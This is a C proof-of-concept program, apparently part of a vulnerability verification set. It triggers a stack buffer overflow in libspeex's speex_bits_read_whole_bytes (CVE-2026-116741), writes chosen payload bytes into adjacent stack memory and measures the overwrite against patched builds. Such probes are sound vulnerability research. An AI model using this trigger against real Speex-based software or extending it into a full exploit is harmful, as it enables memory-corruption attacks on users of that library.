/* Plain stack-layout probe for CVE-2026-116741. A stack struct places a
 * canary field immediately after the 16-byte non-owner SpeexBits buffer,
 * so the two sequential oversize reads land caller-chosen bytes in adjacent
 * STACK memory (canary[8..15] = payload[0..7]). Mirrors adjacent.c but on
 * the stack. Built against the pinned plain gcc libspeex trees. Not part of
 * run-all.sh / the W245 witness set. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16
struct frame {
   char buf[BUFSZ];
   char canary[16];
};

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "attack";
   int attack = strcmp(mode, "attack") == 0 || strcmp(mode, "fixed") == 0;
   struct frame f;
   SpeexBits bits;
   char seed[8];
   char payload[16];
   char before[16];
   int i, changed = 0, chosen = 0;

   memset(&f, 0, sizeof f);
   for (i = 0; i < 16; i++)
      f.canary[i] = (char)(0x50 + i);
   memcpy(before, f.canary, 16);
   printf("buf=%p canary=%p delta=%ld\n", (void *)f.buf, (void *)f.canary,
          (long)(f.canary - f.buf));

   speex_bits_init_buffer(&bits, f.buf, BUFSZ);
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);
   for (i = 0; i < 16; i++)
      payload[i] = (char)('i' + i);

   /* First oversize read writes f.buf+8..23 (payload[0..15]), nbBits=192.
    * Second oversize read writes f.buf+24..39, so payload[0..7] land in
    * f.canary[8..15]. Vendor fix writes 7 then 0 bytes: canary untouched. */
   speex_bits_read_whole_bytes(&bits, payload, attack ? 16 : 8);
   speex_bits_read_whole_bytes(&bits, payload, attack ? 16 : 8);

   printf("canary=");
   for (i = 0; i < 16; i++)
      printf("%02x", (unsigned char)f.canary[i]);
   printf("\n");
   for (i = 0; i < 16; i++)
      if ((unsigned char)f.canary[i] != (unsigned char)before[i])
         changed++;
   for (i = 0; i < 8; i++)
      if ((unsigned char)f.canary[8 + i] == (unsigned char)payload[i])
         chosen++;
   printf("changed=%d chosen=%d\n", changed, chosen);

   speex_bits_destroy(&bits);
   return 0;
}
